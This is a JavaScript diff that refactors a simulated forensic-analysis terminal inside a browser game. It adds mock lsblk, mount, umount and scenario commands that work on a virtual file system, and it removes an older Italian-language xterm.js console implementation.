+      const scenarios = getAvailableScenarios?.() || [];
+      if (scenarios.length === 0) {
+        return 'No scenarios available.';
+      }
+      return [
+        'Available scenarios:',
+        ...scenarios.map(s => `  ${s.id}: ${s.title} (${s.taskCount} tasks)`)
+      ].join('\n');
+    }
+
+    const scenarioId = args[0];
+    const success = await switchScenarioWithIntro(scenarioId);
+    if (success) {
+      // Note: HUD update handled by taskManager emitting PROGRESS_UPDATED event
+      return `Switched to scenario: ${scenarioId}`;
+    } else {
+      return `Failed to switch to scenario: ${scenarioId}`;
+    }
+  });
+
+  // progress
+  registerCommand('progress', () => {
+    const prog = getProgress?.();
+    return [
+      `Scenario: ${prog?.scenarioTitle || 'None'}`,
+      `Progress: ${prog?.current || 0}/${prog?.total || 0} tasks (${prog?.percentage || 0}%)`
+    ].join('\n');
+  });
+
+  // lsblk
+  registerCommand('lsblk', () => {
+    const devices = window.attachedDevices || [];
+    if (devices.length === 0) {
+      return 'NAME   SIZE TYPE MOUNTPOINT\nsda    256G disk /';
+    }
+
+    let output = 'NAME   SIZE TYPE MOUNTPOINT\nsda    256G disk /\n';
+    devices.forEach(dev => {
+      const mounted = dev.mounted ? dev.mountPoint : '';
+      output += `${dev.name}   ${dev.size} disk ${mounted}\n`;
+      if (dev.partitions) {
+        dev.partitions.forEach(part => {
+          const partMounted = part.mounted ? part.mountPoint : '';
+          output += `+-${part.name} ${part.size} part ${partMounted}\n`;
+        });
+      }
+    });
+    return output;
+  });
+
+  // mount
+  registerCommand('mount', (args) => {
+    if (args.length < 2) {
+      return 'Usage: mount <device> <mountpoint>\nExample: mount /dev/sdb1 /mnt/evidence';
+    }
+
+    const device = args[0];
+    const mountPoint = args[1];
+    const devices = window.attachedDevices || [];
+    let deviceFound = null;
+
+    for (const dev of devices) {
+      if (dev.partitions) {
+        const part = dev.partitions.find(p => `/dev/${p.name}` === device);
+        if (part) {
+          deviceFound = part;
+          break;
+        }
+      }
+    }
+
+    if (!deviceFound) {
+      return `mount: ${device}: No such device\nUsa 'lsblk' per vedere i dispositivi disponibili`;
+    }
+
+    if (deviceFound.mounted) {
+      return `mount: ${device}: already mounted on ${deviceFound.mountPoint}`;
+    }
+
+    // Create mount point in VFS
+    const pathParts = mountPoint.split('/').filter(Boolean);
+    let current = VFSManager.root;
+
     for (const part of pathParts) {
-        if (part && currentLevel && currentLevel.type === "directory" && currentLevel.content && currentLevel.content[part]) {
-            currentLevel = currentLevel.content[part];
-        } else {
-            return null;
-        }
+      if (!current.children) current.children = {};
+      if (!current.children[part]) {
+        current.children[part] = { type: 'dir', children: {} };
+      }
+      current = current.children[part];
     }
-    return currentLevel;
+
+    // Add device content
+    if (deviceFound.content && current.children) {
+      for (const [name, data] of Object.entries(deviceFound.content)) {
+        current.children[name] = VFSManager.makeFile(data);
+      }
+    }
+
+    deviceFound.mounted = true;
+    deviceFound.mountPoint = mountPoint;
+
+    return ` Mounted ${device} on ${mountPoint}`;
+  });
+
+  // umount
+  registerCommand('umount', (args) => {
+    if (args.length < 1) {
+      return 'Usage: umount <mountpoint>\nExample: umount /mnt/evidence';
+    }
+
+    const mountPoint = args[0];
+    const devices = window.attachedDevices || [];
+    let found = false;
+
+    for (const dev of devices) {
+      if (dev.partitions) {
+        for (const part of dev.partitions) {
+          if (part.mountPoint === mountPoint) {
+            part.mounted = false;
+            part.mountPoint = '';
+            found = true;
+            break;
+          }
+        }
+      }
+    }
+
+    if (!found) {
+      return `umount: ${mountPoint}: not mounted`;
+    }
+
+    return ` Unmounted ${mountPoint}`;
+  });
+
+  // tutorial
+  registerCommand('tutorial', () => {
+    if (window.tutorial?.restart) {
+      window.tutorial.restart();
+      return 'Restarting tutorial...';
+    }
+    return 'Tutorial manager not available.';
+  });
 }
 
-function initConsole() {
-    // Configurazione avanzata di xterm.js
-    term = new Terminal({
-        cursorBlink: true,
-        fontFamily: "'Courier New', Courier, monospace",
-        fontSize: 14,
-        theme: { background: '#1e1e1e', foreground: '#dcdcdc', cursor: '#dcdcdc' },
-        allowTransparency: true,
-        scrollback: 1000,
-        convertEol: true,
-        // Abilita copia/incolla
-        copyOnSelect: true,
-        rightClickSelectsWord: true
-    });
-    
-    // Carica l'addon Fit
-    fitAddon = new FitAddon.FitAddon();
-    term.loadAddon(fitAddon);
-    
-    term.open(document.getElementById('terminal'));
-    fitAddon.fit();
-
-    updateTaskDisplay();
-    term.writeln("Console Forense Simulata Inizializzata.");
-    term.writeln("Visualizza l'obiettivo corrente nel pannello 'Obiettivo Corrente' qui sopra.");
-    term.writeln("Digita 'help' per i comandi.");
-    term.writeln("Usa frecce Su/Giù per navigare la cronologia, Tab per autocompletamento.");
-    term.writeln("Seleziona testo per copiare, Ctrl+V per incollare.");
-    term.writeln("");
-    prompt();
-
-    // Gestione avanzata degli eventi da tastiera
-    term.onKey(e => {
-        const ev = e.domEvent;
-        const printable = !ev.altKey && !ev.ctrlKey && !ev.metaKey;
-        
-        // Gestione tasti speciali
-        switch (ev.keyCode) {
-            case 13: // Enter
-                if (currentCommand.trim().length > 0) {
-                    term.writeln('');
-                    processCommand(currentCommand.trim());
-                    // Aggiungi alla cronologia solo se non è vuoto e diverso dall'ultimo comando
-                    if (commandHistory.length === 0 || commandHistory[commandHistory.length - 1] !== currentCommand.trim()) {
-                        commandHistory.push(currentCommand.trim());
-                    }
-                    historyIndex = commandHistory.length;
-                }
-                prompt();
-                currentCommand = '';
-                autoCompleteIndex = -1;
-                autoCompleteMatches = [];
-                break;
-                
-            case 8: // Backspace
-                if (currentCommand.length > 0) {
-                    term.write('\b \b');
-                    currentCommand = currentCommand.slice(0, -1);
-                }
-                break;
-                
-            case 38: // Freccia Su (cronologia precedente)
-                if (historyIndex > 0) {
-                    historyIndex--;
-                    // Salva il comando corrente se è la prima volta che si preme freccia su
-                    if (historyIndex === commandHistory.length - 1 && savedCommand === '') {
-                        savedCommand = currentCommand;
-                    }
-                    // Cancella la riga corrente
-                    while (currentCommand.length > 0) {
-                        term.write('\b \b');
-                        currentCommand = currentCommand.slice(0, -1);
-                    }
-                    // Scrivi il comando dalla cronologia
-                    currentCommand = commandHistory[historyIndex];
-                    term.write(currentCommand);
-                }
-                break;
-                
-            case 40: // Freccia Giù (cronologia successiva)
-                if (historyIndex < commandHistory.length) {
-                    historyIndex++;
-                    // Cancella la riga corrente
-                    while (currentCommand.length > 0) {
-                        term.write('\b \b');
-                        currentCommand = currentCommand.slice(0, -1);
-                    }
-                    // Scrivi il comando dalla cronologia o il comando salvato
-                    if (historyIndex === commandHistory.length) {
-                        currentCommand = savedCommand;
-                        savedCommand = '';
-                    } else {
-                        currentCommand = commandHistory[historyIndex];
-                    }
-                    term.write(currentCommand);
-                }
-                break;
-                
-            case 9: // Tab (autocompletamento)
-                ev.preventDefault(); // Previene il comportamento predefinito del tab
-                handleTabCompletion();
-                break;
-                
-            default:
-                if (printable && ev.key.length === 1) {
-                    currentCommand += ev.key;
-                    term.write(ev.key);
-                }
-        }
-    });
-    
-    // Gestione incolla
-    term.element.addEventListener('paste', (event) => {
-        const text = event.clipboardData.getData('text');
-        if (text) {
-            // Aggiungi il testo incollato al comando corrente
-            currentCommand += text;
-            term.write(text);
-        }
-    });
-    
-    closeConsoleBtn.addEventListener("click", toggleConsoleVisibility);
-    
-    // Ridimensiona il terminale quando la finestra cambia dimensione
-    window.addEventListener('resize', () => {
-        fitAddon.fit();
-    });
+// Console visibility - toggling between console and 3D view
+function isConsoleOpen() {
+  const consoleContainer = document.getElementById('consoleContainer');
+  return consoleContainer && consoleContainer.style.display !== 'none';
 }
 
-let currentCommand = '';
-
-function prompt() {
-    term.write(`\r\nanalyst@forensic-station:${currentPath}$ `);
+function isTypingInXterm() {
+  return document.activeElement?.classList.contains('xterm-helper-textarea');
 }
 
-// Funzione per gestire l'autocompletamento con Tab
-function handleTabCompletion() {
-    // Se è la prima volta che si preme Tab, trova i possibili completamenti
-    if (autoCompleteIndex === -1) {
-        const parts = currentCommand.split(' ');
-        const lastPart = parts[parts.length - 1];
-        autoCompletePartial = lastPart;
-        
-        // Se è il primo termine, completa i comandi
-        if (parts.length === 1) {
-            autoCompleteMatches = availableCommands.filter(cmd => cmd.startsWith(lastPart));
-        } 
-        // Se è un percorso, completa file e directory
-        else if (parts[0] === 'cd' || parts[0] === 'ls' || parts[0] === 'cat') {
-            autoCompleteMatches = getPathCompletions(lastPart);
-        }
-        
-        if (autoCompleteMatches.length === 0) return; // Nessun completamento trovato
-        autoCompleteIndex = 0;
+export function toggleConsoleVisibility(force) {
+  const consoleContainer = document.getElementById('consoleContainer');
+  const canvas = document.getElementById('renderCanvas');
+  const wantOpen = (typeof force === 'boolean') ? force : !isConsoleOpen();
+
+  if (wantOpen) {
+    consoleContainer.style.display = 'block';
+    document.exitPointerLock();
+    TerminalManager.open();
+    if (window.tutorial?.signalConsoleOpen) window.tutorial.signalConsoleOpen();
+  } else {
+    consoleContainer.style.display = 'none';
+    if (canvas) {
+      canvas.focus();
+      if (document.pointerLockElement !== canvas && canvas.requestPointerLock)
+        canvas.requestPointerLock();
+    }
+  }
+}
+
+// Manages terminal instance lifecycle - initialization, focus, resize
+const TerminalManager = {
+  open() {
+    if (!TerminalState.term) {
+      TerminalState.term = new Terminal(CONFIG.TERMINAL_CONFIG);
+      TerminalState.fitAddon = new FitAddon();
+      TerminalState.term.loadAddon(TerminalState.fitAddon);
+      TerminalState.term.open(document.getElementById('terminal'));
+      TerminalState.fitAddon.fit();
+
+      TerminalUI.writeLine("Forensic Shell v0.3  type 'help' for commands.");
+      TerminalUI.prompt();
+
+      TerminalState.term.onKey((ev) => InputHandler.onTermKey(ev));
+      addEventListener('resize', () => TerminalState.fitAddon?.fit());
     } else {
-        // Cicla tra i possibili completamenti
-        autoCompleteIndex = (autoCompleteIndex + 1) % autoCompleteMatches.length;
+      TerminalState.fitAddon.fit();
     }
-    
-    // Applica il completamento
-    const completion = autoCompleteMatches[autoCompleteIndex];
-    if (completion) {
-        // Cancella la parte parziale
-        for (let i = 0; i < autoCompletePartial.length; i++) {
-            term.write('\b \b');
-        }
-        
-        // Determina se è un comando o un percorso
-        const parts = currentCommand.split(' ');
-        if (parts.length === 1) {
-            // È un comando
-            currentCommand = completion;
-            term.write(completion);
-        } else {
-            // È un percorso
-            parts.pop(); // Rimuovi l'ultima parte
-            parts.push(completion); // Aggiungi il completamento
-            currentCommand = parts.join(' ');
-            term.write(completion);
-        }
+    TerminalState.buffer = '';
+    TerminalState.cursorPos = 0;
+    setTimeout(() => TerminalState.term.focus(), 0);
+  }
+};
+
+// Public API - initialization entry point
+export function initConsole() {
+  try {
+    VFSManager.initialize();
+    HistoryManager.loadFromStorage();
+    registerBuiltinCommands();
+
+    const closeBtn = document.getElementById('closeConsoleBtn');
+    if (closeBtn) {
+      closeBtn.addEventListener('click', () => toggleConsoleVisibility(false));
     }
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && isConsoleOpen() && !isTypingInXterm()) {
+        e.preventDefault();
+        toggleConsoleVisibility(false);
+      }
+    });
+
+    // Listen to console toggle events from rendering layer (interaction.js)
+    eventBus.on(Events.CONSOLE_TOGGLE, (data) => {
+      const shouldOpen = data?.open !== undefined ? data.open : !isConsoleOpen();
+      console.log(`[Console] Toggle event received - open: ${shouldOpen}`);
+      toggleConsoleVisibility(shouldOpen);
+    });
+
+  } catch (err) {
+    console.error('Failed to initialize console:', err);
+  }
 }
 
-// Funzione per ottenere i possibili completamenti di percorso
-function getPathCompletions(partial) {
-    const completions = [];
-    let basePath = '';
-    let searchTerm = '';
-    
-    // Determina il percorso base e il termine di ricerca
-    if (partial.includes('/')) {
-        const lastSlashIndex = partial.lastIndexOf('/');
-        basePath = partial.substring(0, lastSlashIndex + 1);
-        searchTerm = partial.substring(lastSlashIndex + 1);
-    } else {
-        basePath = currentPath === '~' ? '~/' : currentPath + '/';
-        searchTerm = partial;
-    }
-    
-    // Ottieni l'oggetto directory per il percorso base
-    let dirObject;
-    if (basePath === '~/') {
-        dirObject = fileSystem['~'];
-    } else if (basePath.startsWith('~/')) {
-        const pathParts = basePath.substring(2).split('/').filter(p => p);
-        dirObject = fileSystem['~'];
-        for (const part of pathParts) {
-            if (dirObject && dirObject.type === 'directory' && dirObject.content && dirObject.content[part]) {
-                dirObject = dirObject.content[part];
-            } else {
-                dirObject = null;
-                break;
-            }
-        }
-    } else if (basePath.startsWith('/')) {
-        // Gestione percorsi assoluti
-        const pathParts = basePath.substring(1).split('/').filter(p => p);
-        if (pathParts.length > 0) {
-            const rootDir = pathParts.shift();
-            if (fileSystem['~'].content[rootDir]) {
-                dirObject = fileSystem['~'].content[rootDir];
-                for (const part of pathParts) {
-                    if (dirObject && dirObject.type === 'directory' && dirObject.content && dirObject.content[part]) {
-                        dirObject = dirObject.content[part];
-                    } else {
-                        dirObject = null;
-                        break;
-                    }
-                }
-            }
-        }
-    } else {
-        // Percorso relativo
-        dirObject = getCurrentDirectoryObject();
-    }
-    
-    // Se abbiamo trovato la directory, cerca i possibili completamenti
-    if (dirObject && dirObject.type === 'directory') {
-        for (const item in dirObject.content) {
-            if (item.startsWith(searchTerm)) {
-                const isDir = dirObject.content[item].type === 'directory';
-                completions.push(item + (isDir ? '/' : ''));
-            }
-        }
-    }
-    
-    return completions;
-}
+// NOTE: HUD updates are now handled via event bus
+// showTaskHUD() and hideTaskHUD() are removed - HUD listens to PROGRESS_UPDATED events
 
-function checkTaskCompletion(commandOutput) {
-    if (!currentTask || currentTask.isFinal || !currentTask.keywordToComplete) return;
-
-    if (commandOutput && commandOutput.includes(currentTask.keywordToComplete)) {
-        term.writeln(`\r\n\x1b[32m${currentTask.completionMessage}\x1b[0m`);
-        if (currentTask.nextTaskId) {
-            const nextTask = TASKS.find(t => t.id === currentTask.nextTaskId);
-            if (nextTask) {
-                currentTask = nextTask;
-                updateTaskDisplay();
-                term.writeln(`\r\nNuovo obiettivo: ${currentTask.description.split('\n')[0]}`);
-            } else {
-                currentTask = { description: "Tutti i task principali completati!", isFinal: true };
-                updateTaskDisplay();
-            }
-        } else {
-            currentTask = { description: "Tutti i task completati!", isFinal: true };
-            updateTaskDisplay();
-        }
-    }
-}
-
-function processCommand(command) {
-    const parts = command.split(' ').filter(p => p.length > 0);
-    const cmd = parts[0] ? parts[0].toLowerCase() : '';
-    const arg = parts.slice(1).join(' '); // Gestisce argomenti con spazi, es. percorsi
-    let commandOutputForTaskCheck = "";
-
-    switch (cmd) {
-        case 'help':
-            term.writeln("Comandi disponibili (simulati):");
-            term.writeln("  help          - Mostra questo aiuto.");
-            term.writeln("  ls [percorso] - Lista file e directory (es. ls /etc).");
-            term.writeln("  cd [dir]      - Cambia directory (es. cd case_files, cd .., cd /etc/systemd).");
-            term.writeln("  cat [file]    - Mostra contenuto del file (es. cat suspicious.log).");
-            term.writeln("  task          - Mostra di nuovo l'obiettivo corrente.");
-            term.writeln("  clear         - Pulisce la console.");
-            term.writeln("\nFunzionalità avanzate:");
-            term.writeln("  - Usa frecce Su/Giù per navigare la cronologia dei comandi");
-            term.writeln("  - Usa Tab per autocompletare comandi e percorsi");
-            term.writeln("  - Seleziona testo per copiare, Ctrl+V per incollare");
-            break;
-        case 'ls':
-            let pathToLs = arg ? arg : currentPath;
-            if (arg && !arg.startsWith("/") && !arg.startsWith("~")) {
-                 pathToLs = currentPath === "~" ? "~/" + arg : currentPath + "/" + arg;
-            }
-            const dirObjectForLs = getDirectoryObjectFromPath(pathToLs);
-            if (dirObjectForLs && dirObjectForLs.type === "directory") {
-                if (Object.keys(dirObjectForLs.content).length === 0) term.writeln("(Nessun file o directory)");
-                else Object.keys(dirObjectForLs.content).forEach(item => term.writeln(item + (dirObjectForLs.content[item].type === "directory" ? "/" : "")));
-            } else term.writeln(`ls: impossibile accedere a '${pathToLs}': Non è una directory valida o non esiste.`);
-            break;
-        case 'cd':
-            if (!arg) { term.writeln("cd: specificare una directory."); break; }
-            let newPath;
-            if (arg === "~") newPath = "~";
-            else if (arg.startsWith("/")) newPath = arg; // Percorso assoluto
-            else if (arg.startsWith("~/")) newPath = arg; // Percorso assoluto da home
-            else if (arg === "..") {
-                if (currentPath === "~") newPath = "~";
-                else {
-                    let pathParts = (currentPath.startsWith("~/") ? currentPath.substring(2) : currentPath.substring(1)).split("/").filter(p => p);
-                    pathParts.pop();
-                    if (currentPath.startsWith("~/") || pathParts.length === 0) newPath = pathParts.length > 0 ? "~/" + pathParts.join("/") : "~";
-                    else newPath = "/" + pathParts.join("/");
-                    if (newPath === "/") newPath = "~"; // Evita di andare a una vera radice non gestita
-                }
-            } else {
-                newPath = currentPath === "~" ? "~/" + arg : currentPath + "/" + arg;
-            }
-            const dirObjectForCd = getDirectoryObjectFromPath(newPath);
-            if (dirObjectForCd && dirObjectForCd.type === "directory") {
-                currentPath = newPath;
-                 // Semplifica i percorsi doppi, es. ~/case_files/../case_files -> ~/case_files
-                if (currentPath.includes("..")) {
-                    const parts = currentPath.split('/');
-                    const newParts = [];
-                    for (const part of parts) {
-                        if (part === "..") newParts.pop();
-                        else newParts.push(part);
-                    }
-                    currentPath = newParts.join('/');
-                }
-                if (currentPath.endsWith("/") && currentPath !== "~/") currentPath = currentPath.slice(0, -1);
-                if (currentPath === "") currentPath = "~"; // Fallback se il path diventa vuoto
-
-            } else term.writeln(`cd: ${arg}: Non è una directory o non esiste.`);
-            break;
-        case 'cat':
-            if (!arg) { term.writeln("cat: specificare un nome file."); break; }
-            let pathToFileCat = arg;
-            if (!arg.startsWith("/") && !arg.startsWith("~")) {
-                 pathToFileCat = currentPath === "~" ? "~/" + arg : currentPath + "/" + arg;
-            }
-            const fileObjectForCat = getObjectFromPath(pathToFileCat);
-            if (fileObjectForCat && fileObjectForCat.type === "file") {
-                commandOutputForTaskCheck = fileObjectForCat.content;
-                term.writeln(commandOutputForTaskCheck.replace(/\n/g, "\r\n"));
-            } else term.writeln(`cat: ${arg}: File non trovato o non è un file.`);
-            break;
-        case 'task':
-             if (currentTask) term.writeln(`\r\nObiettivo: ${currentTask.description.replace(/\n/g, "\r\n")}`);
-             else term.writeln("Nessun task attivo al momento.");
-            break;
-        case 'clear':
-            term.clear();
-            break;
-        default:
-            if (cmd) term.writeln(`${cmd}: comando non trovato.`);
-            break;
-    }
-    if (commandOutputForTaskCheck) checkTaskCompletion(commandOutputForTaskCheck);
-}
-
-// Funzione helper per ottenere un oggetto (file o dir) da un percorso completo
-function getObjectFromPath(fullPath) {
-    let pathParts;
-    let currentLevel = fileSystem["~"];
-
-    if (fullPath === "~") return fileSystem["~"];
-    if (fullPath.startsWith("~/")) pathParts = fullPath.substring(2).split("/").filter(p => p);
-    else if (fullPath.startsWith("/")) {
-        pathParts = fullPath.substring(1).split("/").filter(p => p);
-        const rootDir = pathParts.shift(); 
-        if (fileSystem["~"] && fileSystem["~"].content[rootDir]) {
-            currentLevel = fileSystem["~"].content[rootDir];
-        } else {
-            return null;
-        }
-    } else return null; // Percorso non valido
-
-    for (let i = 0; i < pathParts.length; i++) {
-        const part = pathParts[i];
-        if (part && currentLevel && currentLevel.type === "directory" && currentLevel.content && currentLevel.content[part]) {
-            currentLevel = currentLevel.content[part];
-        } else {
-            return null;
-        }
-    }
-    return currentLevel;
-}
-
-// Funzione helper per ottenere specificamente un oggetto directory
-function getDirectoryObjectFromPath(fullPath) {
-    const obj = getObjectFromPath(fullPath);
-    return (obj && obj.type === "directory") ? obj : null;
-}
-
-let consoleOpenedOnce = false;
-function toggleConsoleVisibility() {
-    const consoleContainer = document.getElementById("consoleContainer");
-    const shortcutHint = document.getElementById("shortcutHint");
-    
-    if (consoleContainer.style.display === "none") {
-        consoleContainer.style.display = "flex";
-        
-        // Se è la prima volta che apriamo la console, nascondi l'hint
-        if (!consoleOpenedOnce) {
-            consoleOpenedOnce = true;
-            
-            // Aggiungi una classe per l'animazione di fade-out
-            shortcutHint.classList.add('fade-out-hint');
-            
-            // Rimuovi l'elemento dopo l'animazione
-            setTimeout(() => {
-                shortcutHint.style.display = "none";
-            }, 500);
-        }
-    } else {
-        consoleContainer.style.display = "none";
-    }
-}
+console.log('Console loaded (task system managed by taskManager.js)');
